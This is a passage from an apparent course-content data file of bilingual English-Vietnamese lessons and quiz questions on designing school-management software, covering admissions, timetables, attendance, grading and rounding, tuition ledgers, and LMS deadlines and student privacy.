UPDATE CourseSection
SET Enrolled = Enrolled + 1
WHERE Id = @sectionId
  AND Enrolled < Capacity;
-- 0 rows updated → the section is full`}},{type:"list",items:["Ask: if an admitted applicant does not confirm by the deadline, does the seat go to the waitlist?","Ask: can a student register while the prerequisite grade is not final yet?","Ask: who may add a student over capacity, and is it logged?"]}],remember:`An application is not a student. Take seats in one safe database step, and find duplicates by real identity.
VI: Hồ sơ đăng ký chưa phải là học sinh. Giữ chỗ bằng một bước an toàn trong cơ sở dữ liệu, và lọc trùng theo danh tính thật.`,questions:[{id:"education.admission.1",kind:"mcq",difficulty:"easy",prompt:"Many admitted applicants never come. When is it safest to create the real `Student` record?\nVI: Nhiều người trúng tuyển nhưng không nhập học. Tạo bản ghi `Student` thật vào lúc nào là an toàn nhất?",choices:["When the application is submitted","When the applicant is admitted","When the applicant is enrolled","When the school year ends"],answer:2,why:`Only enrolled people are real students. Creating students earlier fills class lists and fee reports with people who never join.
VI: Chỉ người đã nhập học mới là học sinh thật. Tạo sớm hơn sẽ làm danh sách lớp và báo cáo học phí có cả người không bao giờ đến học.`},{id:"education.admission.2",kind:"debug",difficulty:"hard",prompt:"A course section has capacity 40. After registration day it has 41 students, but `Enrolled` shows 40. What is the most likely cause?\nVI: Lớp học phần có sĩ số tối đa 40. Sau ngày đăng ký, lớp có 41 sinh viên nhưng `Enrolled` chỉ là 40. Nguyên nhân có khả năng nhất là gì?",choices:["Two requests read 39 at once and both wrote 40","The page showed an old number from the cache","A staff member changed the capacity to 41","The database rounded the number down"],answer:0,why:"This is a race condition: two requests check at the same moment and both see one free seat. A single `UPDATE ... WHERE Enrolled < Capacity` prevents it.\nVI: Đây là lỗi tranh chấp: hai yêu cầu kiểm tra cùng lúc và đều thấy còn một chỗ. Một câu `UPDATE ... WHERE Enrolled < Capacity` duy nhất sẽ ngăn được lỗi này."},{id:"education.admission.3",kind:"scenario",difficulty:"medium",prompt:`Grade 10 has a quota of 450, and 450 are admitted. Then 12 admitted applicants withdraw. What should the system do?
VI: Lớp 10 có chỉ tiêu 450 và đã nhận đủ 450. Sau đó 12 người trúng tuyển rút hồ sơ. Hệ thống nên làm gì?`,choices:["Offer the 12 seats to the waitlist, in rank order","Raise next year’s quota by 12 seats","Admit the 12 applicants who applied last","Keep the 12 seats empty until next year"],answer:0,why:`The waitlist exists for exactly this case. Rank order keeps it fair and easy to explain to parents.
VI: Danh sách chờ có để dùng cho đúng trường hợp này. Xét theo thứ tự xếp hạng giúp công bằng và dễ giải thích với phụ huynh.`},{id:"education.admission.4",kind:"compare",difficulty:"medium",prompt:`How should the system find duplicate applications for the same child?
VI: Hệ thống nên tìm hồ sơ trùng của cùng một em như thế nào?`,choices:["Match on the child’s ID number and birth date","Match on the parent’s phone number only","Match on the child’s full name only","Let staff notice when they read the files"],answer:0,why:`Many children share a full name, and parents change phones. An ID number with birth date points to one real child.
VI: Nhiều em trùng họ tên, còn phụ huynh có thể đổi số điện thoại. Mã định danh kèm ngày sinh chỉ đúng một em.`}]},{id:"education.timetable",title:"Timetables · Thời khóa biểu",summary:`Put every lesson in a period and a room, with no clashes.
VI: Xếp mỗi buổi học vào một tiết và một phòng, không bị trùng lịch.`,minutes:4,blocks:[{type:"text",text:`A **timetable** places each lesson in a **period** (a fixed time slot in the day) and a room. One timetable row is: day, period, class, subject, teacher, room.
VI: **Thời khóa biểu** xếp mỗi buổi học vào một **tiết** (khung giờ cố định trong ngày) và một phòng. Một dòng thời khóa biểu gồm: thứ, tiết, lớp, môn, giáo viên, phòng.`},{type:"diagram",text:`Monday   │ 10A1      │ 10A2      │ 10A3
─────────┼───────────┼───────────┼──────────
Period 1 │ Math      │ Physics   │ English
         │ Ms Lan    │ Mr Hung   │ Ms Mai
         │ R101      │ R102      │ R103
─────────┼───────────┼───────────┼──────────
Period 2 │ Math      │ Math      │ History
         │ Ms Lan *  │ Ms Lan *  │ Mr Tuan
         │ R101      │ R102      │ R103

* Ms Lan is in two rooms at once: clash`},{type:"text",text:`There are three **hard constraints** (rules that must never break). A teacher, a room and a class can each be in only one place per period.
VI: Có ba **ràng buộc cứng** (quy tắc không bao giờ được vi phạm). Mỗi giáo viên, mỗi phòng và mỗi lớp chỉ ở một nơi trong mỗi tiết.`},{type:"code",code:{lang:"sql",text:`-- The database blocks every clash
CREATE UNIQUE INDEX UX_Teacher_Slot
  ON TimetableSlot (SemesterId, DayOfWeek,
                    Period, TeacherId);
CREATE UNIQUE INDEX UX_Room_Slot
  ON TimetableSlot (SemesterId, DayOfWeek,
                    Period, RoomId);
CREATE UNIQUE INDEX UX_Class_Slot
  ON TimetableSlot (SemesterId, DayOfWeek,
                    Period, ClassId);`}},{type:"text",text:`**Soft constraints** are wishes. For example: no more than two Math periods in a row, or a teacher’s free afternoon. A good timetable breaks as few of them as possible.
VI: **Ràng buộc mềm** là mong muốn. Ví dụ: không quá hai tiết Toán liên tiếp, hoặc một buổi chiều nghỉ của giáo viên. Thời khóa biểu tốt vi phạm càng ít càng tốt.`},{type:"text",text:`Why is automatic timetabling hard? Every choice limits the next ones. The number of possible timetables grows too fast to check them all. Tools use **heuristics** (simple rules that find a good answer fast) and accept "good enough".
VI: Vì sao xếp thời khóa biểu tự động lại khó? Mỗi lựa chọn giới hạn các lựa chọn sau. Số cách xếp tăng quá nhanh nên không thể thử hết. Công cụ dùng **heuristic** (quy tắc đơn giản tìm lời giải tốt thật nhanh) và chấp nhận kết quả "đủ tốt".`},{type:"example",title:"The sick teacher",text:`Mr Hung is sick for two weeks. Another teacher covers his 18 periods. If staff edit the main timetable, nobody knows later who really taught. Teaching hours and extra pay then come out wrong.
VI: Thầy Hùng nghỉ ốm hai tuần. Một giáo viên khác dạy thay 18 tiết của thầy. Nếu sửa thẳng thời khóa biểu chính, sau này không ai biết ai đã thực sự dạy. Khi đó số giờ dạy và tiền dạy thay sẽ bị tính sai.`},{type:"list",items:["Ask: can two classes share one lesson, for example PE with one teacher?","Ask: does a timetable change start from a date, or apply to the whole semester?","Ask: which constraints are hard rules, and which are only wishes?"]}],remember:`A teacher, a room and a class can each be in one place per period. Let the database enforce it.
VI: Giáo viên, phòng và lớp mỗi thứ chỉ ở một nơi trong mỗi tiết. Hãy để cơ sở dữ liệu đảm bảo điều đó.`,questions:[{id:"education.timetable.1",kind:"mcq",difficulty:"easy",prompt:`Which of these is a hard constraint in a school timetable?
VI: Điều nào sau đây là ràng buộc cứng trong thời khóa biểu?`,choices:["A room cannot hold two classes in one period","Math should be in the morning when possible","Teachers like to have Friday afternoon free","No more than two Math periods in a row"],answer:0,why:`Two classes in one room at the same time is physically impossible. The other choices are wishes that a timetable may break if needed.
VI: Hai lớp học cùng phòng cùng lúc là điều không thể. Các lựa chọn còn lại là mong muốn, có thể vi phạm khi cần.`},{id:"education.timetable.2",kind:"debug",difficulty:"medium",prompt:"A unique index on `(DayOfWeek, Period, TeacherId)` blocks saving the new semester’s timetable. There is no real clash. Why?\nVI: Chỉ mục duy nhất trên `(DayOfWeek, Period, TeacherId)` chặn việc lưu thời khóa biểu học kỳ mới. Thực tế không có trùng lịch. Vì sao?",choices:["The index has no SemesterId, so old semesters clash","The table has too many rows for a unique index","Two teachers have the same name in the system","Period should be a time column, not a number"],answer:0,why:"Without `SemesterId`, last semester’s Monday period 1 counts as the same slot. The key must include everything that makes a slot unique.\nVI: Thiếu `SemesterId` thì tiết 1 thứ Hai của học kỳ trước bị coi là cùng một ô. Khóa phải gồm mọi thứ làm nên một ô lịch duy nhất."},{id:"education.timetable.3",kind:"scenario",difficulty:"medium",prompt:`Ms Mai is sick on Tuesday. Mr Tuan teaches her 10A3 English lesson. How should the system record it?
VI: Cô Mai nghỉ ốm hôm thứ Ba. Thầy Tuấn dạy thay tiết Tiếng Anh lớp 10A3. Hệ thống nên ghi nhận thế nào?`,choices:["Add a substitution row for that date and period","Change the teacher on the main timetable row","Mark the lesson cancelled and record nothing","Ask Mr Tuan to note it in a shared Excel file"],answer:0,why:`A dated substitution row keeps the plan and the reality. Pay for teaching hours can then use who really taught.
VI: Dòng dạy thay có ngày giữ được cả kế hoạch lẫn thực tế. Tiền giờ dạy khi đó tính theo người thực sự đứng lớp.`},{id:"education.timetable.4",kind:"truefalse",difficulty:"hard",prompt:`For a large school, a program can try every possible timetable and pick the best one in a few minutes.
VI: Với trường lớn, một chương trình có thể thử mọi cách xếp thời khóa biểu và chọn cách tốt nhất trong vài phút.`,choices:["True","False"],answer:1,why:`The number of combinations grows far too fast. Real tools search smartly and stop at a good result, not a proven best one.
VI: Số tổ hợp tăng quá nhanh. Công cụ thực tế tìm kiếm thông minh và dừng ở kết quả tốt, không phải kết quả tốt nhất đã được chứng minh.`}]},{id:"education.attendance",title:"Attendance · Điểm danh và chuyên cần",summary:`Record who was there, why someone was not, and which rules follow.
VI: Ghi nhận ai có mặt, vì sao ai đó vắng, và quy định nào được áp dụng.`,minutes:4,blocks:[{type:"text",text:`Schools take **attendance** per day or per **period**. Per period gives more detail. A student can be present in period 1 and missing in period 4.
VI: Trường **điểm danh** theo ngày hoặc theo **tiết**. Điểm danh theo tiết chi tiết hơn. Học sinh có thể có mặt tiết 1 nhưng vắng tiết 4.`},{type:"diagram",text:`Class 10A1, Monday 2025-10-13
┌───────┬────┬────┬────┬────┬────┐
│Student│ P1 │ P2 │ P3 │ P4 │ P5 │
├───────┼────┼────┼────┼────┼────┤
│ An    │ .  │ .  │ .  │ AU │ AU │
│ Binh  │ L  │ .  │ .  │ .  │ .  │
│ Chi   │ AP │ AP │ AP │ AP │ AP │
└───────┴────┴────┴────┴────┴────┘
 .  present        L  late
 AP absent with permission
 AU absent without permission`},{type:"text",text:`Keep a small fixed list of **statuses**: Present, Late, Absent with permission, Absent without permission. Permission usually comes from a parent’s note that a teacher approves.
VI: Giữ danh sách **trạng thái** cố định: Có mặt, Đi muộn, Vắng có phép, Vắng không phép. "Có phép" thường dựa trên đơn xin phép của phụ huynh được giáo viên duyệt.`},{type:"text",text:`When a child is absent without notice, parents want to know fast. For example, send an app message or SMS before 9:00. Send one message per day, not one per period.
VI: Khi con vắng mà không báo trước, phụ huynh muốn biết sớm. Ví dụ, gửi tin qua app hoặc SMS trước 9 giờ. Gửi một tin mỗi ngày, không gửi mỗi tiết một tin.`},{type:"text",text:`Rules turn attendance into decisions. For example, a university may ban a student from the final exam after missing over 20% of sessions. The exact limit is a business rule, so ask for it.
VI: Quy định biến dữ liệu điểm danh thành quyết định. Ví dụ, trường đại học có thể cấm thi nếu sinh viên vắng quá 20% số buổi. Con số chính xác là quy định nghiệp vụ, nên phải hỏi.`},{type:"code",code:{lang:"ts",text:`// Can the student sit the final exam?
const total = sessions.length;
const missed = sessions.filter(
  s => s.status.startsWith('Absent')).length;
// Example rule: at most 20% absent
const canSit = missed / total <= 0.2;`}},{type:"example",title:"The late permission note",text:`Chi was absent on Monday. On Wednesday her parent sends the permission note. The teacher changes Monday to "with permission". The system must keep who changed it, when, and the old value.
VI: Chi vắng hôm thứ Hai. Thứ Tư phụ huynh mới gửi đơn xin phép. Giáo viên đổi ngày thứ Hai thành "có phép". Hệ thống phải lưu ai sửa, sửa lúc nào và giá trị cũ.`},{type:"list",items:["Ask: do lates count toward absences, for example 3 lates = 1 absence?","Ask: until when may a teacher change a past attendance record?","Ask: do school trips and competitions count as absences?","Ask: is the absence limit per subject, per semester or per year?"]}],remember:`Store one attendance row per student per session, with a clear status. Rules like exam bans read from it.
VI: Lưu một dòng điểm danh cho mỗi học sinh mỗi buổi, với trạng thái rõ ràng. Các quy định như cấm thi đọc từ dữ liệu này.`,questions:[{id:"education.attendance.1",kind:"mcq",difficulty:"easy",prompt:`Why might a school record attendance per period instead of per day?
VI: Vì sao trường có thể điểm danh theo tiết thay vì theo ngày?`,choices:["It shows students who leave after the first periods","It makes the attendance table smaller and faster","Parents can only read reports per period","It removes the need for permission notes"],answer:0,why:`A per-day record says "present" even if the student left at break time. Per period catches that.
VI: Điểm danh theo ngày vẫn ghi "có mặt" dù học sinh bỏ về giữa buổi. Điểm danh theo tiết phát hiện được việc đó.`},{id:"education.attendance.2",kind:"code",difficulty:"hard",prompt:`It is week 1 of a new course, so no sessions are recorded yet. What does this TypeScript print?
VI: Đây là tuần 1 của học phần mới, chưa có buổi học nào được ghi. Đoạn TypeScript này in ra gì?`,code:{lang:"ts",text:`const sessions: Session[] = [];
const total = sessions.length;
const missed = sessions.filter(
  s => s.status.startsWith('Absent')).length;
const canSit = missed / total <= 0.2;
console.log(canSit);`},choices:["true","false","A divide-by-zero error","undefined"],answer:1,why:"`0 / 0` is `NaN` in JavaScript, and any comparison with `NaN` is false. Every student is blocked until you handle `total === 0`.\nVI: `0 / 0` trong JavaScript là `NaN`, và mọi phép so sánh với `NaN` đều cho false. Mọi sinh viên bị chặn cho đến khi bạn xử lý trường hợp `total === 0`."},{id:"education.attendance.3",kind:"scenario",difficulty:"medium",prompt:`A parent sends a permission note two days after the absence. What should the system do?
VI: Phụ huynh gửi đơn xin phép hai ngày sau buổi vắng. Hệ thống nên làm gì?`,choices:["Update the status and log who changed it","Refuse it, because that day is already closed","Delete the old row and insert a new one","Add a second row for the same day"],answer:0,why:`Late notes are normal, so the status must be changeable. A change log keeps the old value for disputes and reports.
VI: Đơn xin phép nộp muộn là chuyện bình thường, nên trạng thái phải sửa được. Nhật ký thay đổi giữ giá trị cũ để đối chiếu khi có khiếu nại.`},{id:"education.attendance.4",kind:"debug",difficulty:"medium",prompt:`A parent got five SMS messages about one child’s absence on one day. What is the most likely cause?
VI: Phụ huynh nhận năm tin SMS về việc một em vắng trong một ngày. Nguyên nhân có khả năng nhất là gì?`,choices:["The job sends one message per absent period","The SMS provider repeats every message","Five teachers share one phone number","The parent’s phone number was saved five times"],answer:0,why:`Per-period data was sent straight to parents. Group absences by student and day, then send one message.
VI: Dữ liệu theo tiết bị gửi thẳng cho phụ huynh. Hãy gom các buổi vắng theo học sinh và ngày, rồi gửi một tin.`}]},{id:"education.grades",title:"Grades and GPA · Điểm số và điểm trung bình",summary:`Weighted scores, grade scales, GPA, rounding, and locking grades after publishing.
VI: Điểm thành phần có hệ số, thang điểm, điểm trung bình tích lũy, làm tròn và khóa điểm sau khi công bố.`,minutes:5,blocks:[{type:"text",text:`A subject score is built from **score components**. Each has a **weight** (how much it counts). For example: oral ×1, 15-minute test ×1, midterm ×2, final exam ×3.
VI: Điểm môn học được tính từ các **điểm thành phần**. Mỗi loại có **hệ số** (mức độ được tính). Ví dụ: điểm miệng hệ số 1, kiểm tra 15 phút hệ số 1, giữa kỳ hệ số 2, cuối kỳ hệ số 3.`},{type:"diagram",text:`Math, semester 1, An (10-point scale)
┌────────────┬───────┬────────┬───────┐
│ Component  │ Score │ Weight │ S × W │
├────────────┼───────┼────────┼───────┤
│ Oral       │  8.0  │   1    │  8.0  │
│ 15-minute  │  7.0  │   1    │  7.0  │
│ Midterm    │  6.5  │   2    │ 13.0  │
│ Final      │  8.0  │   3    │ 24.0  │
├────────────┼───────┼────────┼───────┤
│ Total      │       │   7    │ 52.0  │
└────────────┴───────┴────────┴───────┘
 Average = 52.0 / 7 = 7.428... → 7.4`},{type:"text",text:`Divide by the **sum of weights**, not by the number of scores. At university, each course gets a letter grade and points on a **4-point scale**. **GPA** (grade point average) weights each course by its **credits** (units of study load).
VI: Chia cho **tổng hệ số**, không chia cho số đầu điểm. Ở đại học, mỗi học phần có điểm chữ và điểm **thang 4**. **GPA** (điểm trung bình tích lũy) tính trọng số mỗi học phần theo số **tín chỉ**.`},{type:"diagram",text:`Example mapping (each school sets its own)
 8.5-10.0  A  4      4.0-5.4  D  1
 7.0-8.4   B  3      below 4  F  0
 5.5-6.9   C  2

┌──────────┬─────────┬───────┬─────────┐
│ Course   │ Credits │ Grade │ Cr × Pt │
├──────────┼─────────┼───────┼─────────┤
│ Calculus │    3    │ A (4) │   12    │
│ English  │    2    │ B (3) │    6    │
│ Physics  │    4    │ C (2) │    8    │
├──────────┼─────────┼───────┼─────────┤
│ Total    │    9    │       │   26    │
└──────────┴─────────┴───────┴─────────┘
 GPA = 26 / 9 = 2.888... → 2.89`},{type:"text",text:`**Rounding** needs one written rule: how many decimals, and at which step. Round each component, each subject, or only the final GPA? Different steps give different results.
VI: **Làm tròn** cần một quy tắc viết rõ: mấy chữ số thập phân, và làm tròn ở bước nào. Làm tròn từng điểm thành phần, từng môn, hay chỉ GPA cuối cùng? Mỗi cách cho kết quả khác nhau.`},{type:"code",code:{lang:"csharp",text:`decimal avg = 8.45m;
// .NET default: round half to even
Math.Round(avg, 1);               // 8.4
// Round half up, as people do on paper
Math.Round(avg, 1,
  MidpointRounding.AwayFromZero); // 8.5
// Example scale: 8.4 is a B, 8.5 is an A`}},{type:"text",text:`After grades are **published**, lock them. Later changes go through a **regrade request**: who asked, old score, new score, reason, approver. Keep an **audit log** (a record of every change).
VI: Sau khi **công bố**, hãy khóa điểm. Mọi thay đổi sau đó đi qua **đơn phúc khảo**: ai yêu cầu, điểm cũ, điểm mới, lý do, người duyệt. Hãy lưu **nhật ký thay đổi** (audit log) cho mọi lần sửa.`},{type:"example",title:"One regrade, many effects",text:`After a regrade, a final exam goes from 4.5 to 6.0. The subject score, the GPA and the scholarship ranking all change. The system must recalculate everything that depends on that score.
VI: Sau phúc khảo, điểm thi cuối kỳ tăng từ 4,5 lên 6,0. Điểm môn, GPA và thứ hạng xét học bổng đều thay đổi. Hệ thống phải tính lại mọi thứ phụ thuộc vào điểm đó.`},{type:"list",items:["Ask: how many decimals at each step, and is it half up or half to even?","Ask: if a student retakes a course, which score counts in the GPA?","Ask: who can unlock a published grade, and until when?"]}],remember:`Weighted average = sum of score × weight, divided by sum of weights. Write down the rounding rule and lock published grades.
VI: Điểm trung bình có hệ số = tổng điểm × hệ số, chia cho tổng hệ số. Hãy viết rõ quy tắc làm tròn và khóa điểm đã công bố.`,questions:[{id:"education.grades.1",kind:"mcq",difficulty:"medium",prompt:`Weights are oral 1, 15-minute 1, midterm 2, final 3. A student scores 10, 10, 5 and 5. What is the average, to one decimal?
VI: Hệ số là miệng 1, 15 phút 1, giữa kỳ 2, cuối kỳ 3. Học sinh được 10, 10, 5 và 5. Điểm trung bình, làm tròn một chữ số thập phân, là bao nhiêu?`,choices:["6.4","7.5","6.0","7.1"],answer:0,why:`10 + 10 + 2×5 + 3×5 = 45, and 45 / 7 = 6.43, so 6.4. The 7.5 is a plain average that ignores weights.
VI: 10 + 10 + 2×5 + 3×5 = 45, và 45 / 7 = 6,43, nên được 6,4. Con số 7,5 là trung bình cộng thường, bỏ qua hệ số.`},{id:"education.grades.2",kind:"compare",difficulty:"medium",prompt:`A student has Calculus A (3 credits), English B (2 credits) and Physics C (4 credits). Which GPA is right?
VI: Sinh viên có Giải tích điểm A (3 tín chỉ), Tiếng Anh điểm B (2 tín chỉ), Vật lý điểm C (4 tín chỉ). GPA nào đúng?`,choices:["Weighted by credits: 26 / 9 = 2.89","Simple average: (4 + 3 + 2) / 3 = 3.00","Sum of points: 4 + 3 + 2 = 9","Best grade only: 4.00"],answer:0,why:`A 4-credit course is more study than a 2-credit one, so it counts more. The simple average gives the small A course too much weight.
VI: Học phần 4 tín chỉ có khối lượng học lớn hơn học phần 2 tín chỉ, nên được tính nặng hơn. Trung bình cộng thường làm học phần nhỏ điểm A có trọng số quá lớn.`},{id:"education.grades.3",kind:"code",difficulty:"hard",prompt:`The school rule says scores round half up. What does this C# print?
VI: Quy định của trường là làm tròn 0,5 lên. Đoạn C# này in ra gì?`,code:{lang:"csharp",text:`decimal score = 6.25m;
Console.WriteLine(Math.Round(score, 1));`},choices:["6.2","6.3","6.25","6"],answer:0,why:"`Math.Round` in .NET rounds half to even by default, so 6.25 becomes 6.2. Pass `MidpointRounding.AwayFromZero` to get 6.3.\nVI: Mặc định `Math.Round` trong .NET làm tròn về số chẵn gần nhất, nên 6.25 thành 6.2. Truyền `MidpointRounding.AwayFromZero` để được 6.3."},{id:"education.grades.4",kind:"scenario",difficulty:"medium",prompt:`A teacher finds a typing error in a grade one week after grades were published. What should happen?
VI: Giáo viên phát hiện nhập sai một điểm, một tuần sau khi điểm đã công bố. Nên xử lý thế nào?`,choices:["A change request that is approved and logged","A direct edit of the score in the database","Delete the grade and ask for a retake exam","Nothing, published grades can never change"],answer:0,why:`Published grades are locked, but real mistakes must be fixable. An approved, logged change keeps trust and shows who changed what.
VI: Điểm đã công bố bị khóa, nhưng lỗi thật vẫn phải sửa được. Thay đổi có duyệt và có nhật ký giữ được niềm tin và cho biết ai đã sửa gì.`}]},{id:"education.fees",title:"Tuition and fees · Học phí và các khoản thu",summary:`Fee plans, discounts, installments, late fees and refunds, linked to accounting.
VI: Biểu phí, miễn giảm, chia đợt, phí nộp muộn và hoàn phí, kết nối với kế toán.`,minutes:5,blocks:[{type:"text",text:`A **fee plan** lists what a program costs: tuition, books, uniform, school bus, meals. Each item has an amount and a **due date**. University tuition is often priced **per credit**.
VI: **Biểu phí** liệt kê chi phí của một chương trình: học phí, sách, đồng phục, xe đưa đón, tiền ăn. Mỗi khoản có số tiền và **hạn nộp**. Học phí đại học thường tính **theo tín chỉ**.`},{type:"diagram",text:`FeePlan (grade 10, 2025-2026)
   │ creates
   ▼
StudentCharge ◄── Discount, Scholarship
   │               (minus lines)
   ▼
Installments
 ┌─────┬────────────┬────────────┐
 │ No. │ Due date   │ Amount VND │
 ├─────┼────────────┼────────────┤
 │ 1   │ 2025-09-15 │ 12,000,000 │
 │ 2   │ 2026-01-15 │ 12,000,000 │
 └─────┴────────────┴────────────┘
   │
   ▼
Payment ──► Receipt ──► Accounting`},{type:"text",text:`Store **scholarships** and **discounts** as separate lines with a reason, not as a changed price. For example: sibling discount 10%, merit scholarship 2,000,000 VND. Reports can then show what was reduced and why.
VI: Lưu **học bổng** và **miễn giảm** thành các dòng riêng có lý do, không sửa thẳng giá. Ví dụ: giảm 10% cho anh chị em ruột, học bổng 2.000.000 đồng. Khi đó báo cáo cho biết đã giảm bao nhiêu và vì sao.`},{type:"text",text:`A **late fee** is added after the due date, for example a fixed amount after 15 days. A **refund** happens when a student withdraws. It usually depends on the date: more back early, less later.
VI: **Phí nộp muộn** được cộng sau hạn nộp, ví dụ một khoản cố định sau 15 ngày. **Hoàn phí** xảy ra khi học sinh thôi học. Số tiền hoàn thường tùy ngày: rút sớm hoàn nhiều, rút muộn hoàn ít.`},{type:"text",text:`Every charge is money the family owes the school: **accounts receivable**. Payments reduce it. Many schools put the student code in a VietQR transfer note, so bank payments match automatically.
VI: Mỗi khoản phải thu là tiền gia đình nợ nhà trường: **công nợ phải thu**. Mỗi lần nộp tiền làm giảm công nợ. Nhiều trường đưa mã học sinh vào nội dung chuyển khoản VietQR để tự động đối soát.`},{type:"example",title:"Two children, one transfer",text:`A parent pays 30 million VND for two children in one bank transfer, with one student code. The system cannot match it automatically. Staff must split it, so one payment must be able to cover many charges.
VI: Phụ huynh chuyển 30 triệu đồng cho hai con trong một lần chuyển khoản, chỉ ghi một mã học sinh. Hệ thống không tự đối soát được. Kế toán phải tách khoản, nên một lần nộp phải trả được cho nhiều khoản phải thu.`},{type:"code",code:{lang:"sql",text:`-- What each student still owes
-- Ledger: charges are +, payments are -
SELECT StudentId, SUM(Amount) AS Balance
FROM StudentLedger
GROUP BY StudentId
HAVING SUM(Amount) > 0;`}},{type:"list",items:["Ask: is the percentage discount taken before or after the scholarship?","Ask: what is refunded if a student leaves in week 3? In month 3?","Ask: are late fees automatic? Who may waive them?","Ask: if a parent pays too much, is the extra kept as credit?"]}],remember:`Store charges, discounts and payments as separate dated lines. The balance is their sum, never a typed number.
VI: Lưu khoản phải thu, miễn giảm và tiền đã nộp thành các dòng riêng có ngày. Số dư là tổng của chúng, không bao giờ là số gõ tay.`,questions:[{id:"education.fees.1",kind:"scenario",difficulty:"hard",prompt:`Tuition is 24,000,000 VND. The student has a 2,000,000 VND scholarship and a 10% sibling discount. The rule: scholarship first, then the percentage. What does the family pay?
VI: Học phí 24.000.000 đồng. Học sinh có học bổng 2.000.000 đồng và giảm 10% anh chị em ruột. Quy định: trừ học bổng trước, rồi mới giảm phần trăm. Gia đình phải nộp bao nhiêu?`,choices:["19,800,000 VND","19,600,000 VND","21,600,000 VND","20,000,000 VND"],answer:0,why:`24 − 2 = 22 million, then 22 × 0.9 = 19.8 million. Taking 10% first gives 19.6 million, so the order must be written down.
VI: 24 − 2 = 22 triệu, rồi 22 × 0,9 = 19,8 triệu. Nếu giảm 10% trước sẽ ra 19,6 triệu, nên thứ tự phải được ghi rõ.`},{id:"education.fees.2",kind:"debug",difficulty:"medium",prompt:`A student paid in full by bank transfer but still gets late-fee reminders. The transfer note said "hoc phi lop 10A1". What is the most likely cause?
VI: Học sinh đã chuyển khoản đủ nhưng vẫn nhận nhắc phí nộp muộn. Nội dung chuyển khoản ghi "hoc phi lop 10A1". Nguyên nhân có khả năng nhất là gì?`,choices:["The note has no student code, so it never matched","The bank takes three months to send the money","The late fee job runs in the wrong time zone","The fee plan for grade 10 was deleted"],answer:0,why:`A class name does not identify one student. The money sits unmatched, so the charge still looks unpaid.
VI: Tên lớp không xác định được một học sinh. Khoản tiền nằm chờ đối soát, nên khoản phải thu vẫn hiện là chưa nộp.`},{id:"education.fees.3",kind:"compare",difficulty:"medium",prompt:`How should the system store a sibling discount?
VI: Hệ thống nên lưu khoản giảm cho anh chị em ruột thế nào?`,choices:["A separate discount line with a reason","A lower price typed on the student’s charge","A note in the student’s profile","A change to the fee plan for the whole grade"],answer:0,why:`A separate line shows the full price, the discount and the reason. A typed lower price hides how much was given and why.
VI: Dòng riêng cho thấy giá gốc, khoản giảm và lý do. Gõ giá thấp hơn sẽ che mất đã giảm bao nhiêu và vì sao.`},{id:"education.fees.4",kind:"truefalse",difficulty:"medium",prompt:`When a student withdraws, the simplest correct design is to delete their charges and payments.
VI: Khi học sinh thôi học, thiết kế đơn giản và đúng nhất là xóa các khoản phải thu và tiền đã nộp của em đó.`,choices:["True","False"],answer:1,why:`Receipts were issued and accounting already used those lines. Record the refund as new lines and keep the history.
VI: Biên lai đã được phát hành và kế toán đã dùng các dòng đó. Hãy ghi khoản hoàn phí thành dòng mới và giữ nguyên lịch sử.`}]},{id:"education.lms-privacy",title:"Learning platforms and privacy · Nền tảng học tập và quyền riêng tư",summary:`Courses, assignments, deadlines and online exams, plus who may see children’s data.
VI: Khóa học, bài tập, hạn nộp và thi trực tuyến, cùng việc ai được xem dữ liệu của trẻ em.`,minutes:5,blocks:[{type:"text",text:`An **LMS** (learning management system) holds **courses**, **assignments** and **submissions**. A submission is one student’s answer to one assignment, with a time and a score.
VI: **LMS** (hệ thống quản lý học tập) chứa **khóa học**, **bài tập** và **bài nộp**. Bài nộp là bài làm của một học sinh cho một bài tập, có thời gian nộp và điểm.`},{type:"diagram",text:`Course
  │ 1:n
  ▼
Assignment
  DueAtUtc, LatePolicy
  │ 1:n
  ▼
Submission
  StudentId
  SubmittedAtUtc  (server clock)
  Status: OnTime | Late | Missing
  Score`},{type:"text",text:`Store deadlines in **UTC** (one world time) and show them in local time. A deadline like "23:59" must say which time zone. Take submission time from the server, never from the student’s device.
VI: Lưu hạn nộp theo **UTC** (giờ chuẩn quốc tế) và hiển thị theo giờ địa phương. Hạn "23:59" phải nói rõ múi giờ nào. Lấy thời gian nộp từ máy chủ, không lấy từ thiết bị của học sinh.`},{type:"diagram",text:`Deadline: 23:59 Hanoi time (UTC+7)
        = 16:59 UTC

Student in Tokyo (UTC+9) sees:
        01:59 the next day
Student in Paris (UTC+2, summer) sees:
        18:59 the same day`},{type:"text",text:`Online exams need three things. The server keeps the time limit, questions come in random order, and each saved answer is logged. No system stops all cheating. Logs help teachers review suspicious cases.
VI: Thi trực tuyến cần thời gian làm bài do máy chủ quản lý, câu hỏi xáo trộn thứ tự và nhật ký mỗi lần lưu đáp án. Không hệ thống nào chặn được mọi gian lận. Nhật ký giúp giáo viên xem lại các trường hợp đáng ngờ.`},{type:"example",title:"The 23:58 upload",text:`A student clicks Submit at 23:58. The 50 MB file finishes uploading at 00:03. Is it late? Decide which time counts, the start or the end of the upload. Write it in the late policy.
VI: Học sinh bấm Nộp lúc 23:58. Tệp 50 MB tải lên xong lúc 00:03. Có tính là nộp muộn không? Hãy quyết định mốc nào được tính, lúc bắt đầu hay lúc tải xong. Ghi rõ vào quy định nộp muộn.`},{type:"text",text:`Children’s grades, health notes and family details are sensitive **personal data**. Access follows **roles**: a teacher sees her own classes, a parent sees only their own children. Personal data laws apply, including in Vietnam, so ask the legal team for the exact rules.
VI: Điểm số, thông tin sức khỏe và hoàn cảnh gia đình của trẻ là **dữ liệu cá nhân** nhạy cảm. Quyền xem theo **vai trò**: giáo viên xem lớp mình dạy, phụ huynh chỉ xem con mình. Luật về dữ liệu cá nhân có áp dụng, kể cả ở Việt Nam, nên cần hỏi bộ phận pháp chế quy định cụ thể.`},{type:"compare",left:{title:"May see a student’s grades",items:["Teachers of that class and subject","The homeroom teacher","The student and their linked parents"]},right:{title:"Should not see them",items:["Other parents, even in a class group chat","Teachers of other classes, unless allowed","Outside vendors without a contract and consent"]}},{type:"list",items:["Ask: after a divorce or custody change, which parent may see the child’s data?","Ask: when a student turns 18, do parents keep access?","Ask: how long do we keep exam logs and recordings?"]}],remember:`Deadlines in UTC with server time. Children’s data by role, with consent and access logs.
VI: Hạn nộp lưu theo UTC và dùng giờ máy chủ. Dữ liệu của trẻ được xem theo vai trò, có sự đồng ý và nhật ký truy cập.`,questions:[{id:"education.lms-privacy.1",kind:"debug",difficulty:"medium",prompt:`A teacher in Hanoi sets "due 23:59". A student in Paris also sees "due 23:59" and submits at 23:30 Paris time. The system marks it late. Why?
